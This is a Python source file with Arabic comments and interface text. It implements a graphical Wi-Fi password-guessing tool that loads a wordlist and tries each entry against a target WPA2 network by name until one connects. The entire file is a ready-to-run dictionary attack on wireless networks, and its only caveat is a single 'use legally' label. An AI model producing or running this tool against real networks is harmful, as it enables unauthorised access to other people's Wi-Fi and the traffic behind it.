import tkinter as tk
from tkinter import filedialog, messagebox
from pywifi import PyWiFi, const, Profile
import time

# وظيفة لتحميل ملف كلمات المرور
def load_password_file():
    filepath = filedialog.askopenfilename(
        title="اختر ملف كلمات المرور",
        filetypes=(("Text Files", "*.txt"), ("All Files", "*.*"))
    )
    if filepath:
        with open(filepath, "r") as file:
            passwords = file.read().splitlines()
        return passwords
    else:
        messagebox.showerror("خطأ", "لم يتم اختيار ملف")
        return None

# وظيفة لتجربة كلمات المرور على شبكة Wi-Fi
def test_wifi_password(ssid, passwords):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]  # اختيار أول واجهة شبكة
    iface.disconnect()
    time.sleep(1)

    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    for password in passwords:
        profile.key = password
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)
        time.sleep(5)

        if iface.status() == const.IFACE_CONNECTED:
            messagebox.showinfo("نجاح", f"كلمة المرور الصحيحة هي: {password}")
            iface.disconnect()
            return password
        else:
            print(f"كلمة المرور غير صحيحة: {password}")
    
    messagebox.showwarning("فشل", "لم يتم العثور على كلمة المرور الصحيحة")
    return None

# واجهة رسومية
def start_gui():
    def start_testing():
        ssid = ssid_entry.get()
        if not ssid:
            messagebox.showerror("خطأ", "يرجى إدخال اسم الشبكة (SSID)")
            return

        passwords = load_password_file()
        if passwords:
            test_wifi_password(ssid, passwords)

    # إنشاء النافذة
    root = tk.Tk()
    root.title("برنامج تخمين كلمات مرور Wi-Fi")

    tk.Label(root, text="أدخل اسم شبكة Wi-Fi (SSID):").pack(pady=5)
    ssid_entry = tk.Entry(root, width=30)
    ssid_entry.pack(pady=5)

    tk.Button(root, text="بدء الاختبار", command=start_testing).pack(pady=10)
    tk.Label(root, text="ملاحظة: استخدم هذه الأداة بشكل قانوني فقط.").pack(pady=10)

    root.mainloop()

# تشغيل البرنامج
if __name__ == "__main__":
    start_gui()